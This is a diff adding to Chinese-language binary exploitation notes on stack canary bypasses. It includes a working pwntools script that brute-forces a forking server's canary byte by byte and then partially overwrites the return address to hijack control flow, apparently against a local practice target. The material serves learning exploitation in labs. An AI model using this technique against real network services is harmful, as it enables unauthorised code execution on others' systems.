@@ -166,6 +166,7 @@ int main() {
     }
 }
 的代码，能够爆破canary的值（8字节也只需要爆破256*8次）
+这里有一个隐藏点：即fork不会重新更换canary的值,但是exec是会的！
 
 3. jumping the canary (if the situation allows).
 跳过canary完成返回地址的覆写，主要针对以下场景
@@ -176,6 +177,58 @@ int main() {
 }
 取决于程序的布局，你可以通过修改i值来绕过canary的写入，直接写入返回地址
 这种情况下，在越界到i的位置时，填入返回地址相对于buf的偏移，你就可以绕过canary来写返回地址了。此时再结合alsr的page align原理，爆破你想跳转的地址！
+```
+话又说回爆破，其实对`server`端进行canary的爆破。有很多需要考虑的点，这里用一个脚本做替代讲解:<br>
+```python
+# 1. 首先，默认我们能够拿到server的二进制程序（使用fork分裂进程与网络请求通信），我们只能通过tcpip网络与其交互，首先要解决的是如何调试server的问题
+# gdb调试server时，使用 set follow-fork-mode child 告诉 GDB，当遇到 fork 时，停止调试父进程，转而调试子进程。
+# 默认情况下，GDB 会分离（detach）未被跟踪的进程。如果你希望同时调试父子进程，可以设置 set detach-on-fork off， 这样，GDB 会在一个进程上设置断点，但两个进程都会被暂停，你可以使用 inferior 命令在它们之间切换。
+
+# 2. 网络请求爆破canary时，需要注意控制请求速度，速度太快容易出奇奇怪怪的问题（比如，dup2执行失败了，导致交互收不到回显；又比如 程序在子进程退出后没有成功回收，造成奇怪问题），实测时，0.1s是一个合理的时间
+
+# 3. 记得调试时候提前看一下canary的值，比对一下爆破是否正确
+from pwn import *
+# context.log_level="debug"
+# context.terminal=["tmux","splitw","-h"]
+canary = b""
+
+def brute_force(len,cur_canary):
+    for i in range(256):
+        r = remote("127.0.0.1",1337)
+        r.sendlineafter("Payload size:",str(len))
+        payload = b"a"*120+cur_canary+p8(i)
+        r.sendafter("Send your payload",payload)
+        ret = r.recvall(0.1)
+        r.close()
+        if b"stack smashing detected" not in ret:
+            print("get canary!:",cur_canary+p8(i))
+            cur_canary = cur_canary+p8(i)
+            break
+    return cur_canary
+
+
+for i in range(1,9):
+    canary = brute_force(120+i,canary)
+    print("canary get!")
+    print(hex(u64(canary.ljust(8,b"\x00"))))
+    # pause()
+    # sleep(1)
+
+canary = u64(canary)
+print("successful get canary!")
+pause()
+while True:
+    for i in range(16):
+        r = remote("127.0.0.1",1337)
+        r.sendlineafter("Payload size:",b"138")
+        payload = b"a"*120+p64(canary)+b"a"*8+p8(0xdd)+p8(i*16+4)
+        r.sendafter("Send your payload",payload)
+        ret = r.recvall(0.1)
+        # print(ret)
+        if b"pwn" in ret:
+            print(ret)
+            break
+    pause()
 ```
 
 ## 6. Memory errors protection: ASLR<br>
